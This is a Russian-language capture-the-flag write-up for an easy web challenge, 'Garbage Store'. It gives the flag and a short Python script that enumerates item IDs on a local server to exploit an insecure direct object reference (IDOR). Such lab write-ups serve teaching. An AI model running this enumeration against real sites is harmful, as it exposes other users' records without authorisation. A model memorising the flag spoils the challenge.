# Название: Garbage Store | web | easy
## Описание:
По-моему этот магазин что-то таит в себе, давай проверим? 
### Флаг: 
rtctf{g4rb4g3_m4st3r}
### Решение:
1. Сайт представляет собой магазин различных товаров.
2. Богатого бэкэнда не имеется, все что несет в себе этот сайт - функционал связанный с SQL таблицей 'garbage/<id>'
3. Следовательно остается то, что тут имеется IDOR
```python 
import requests

base_url = "http://127.0.0.1:5000/garbage/"

for id in range(6, 301):
    url = base_url + str(id)
    response = requests.get(url)
    if response.status_code == 200:
        print(response.text)
```
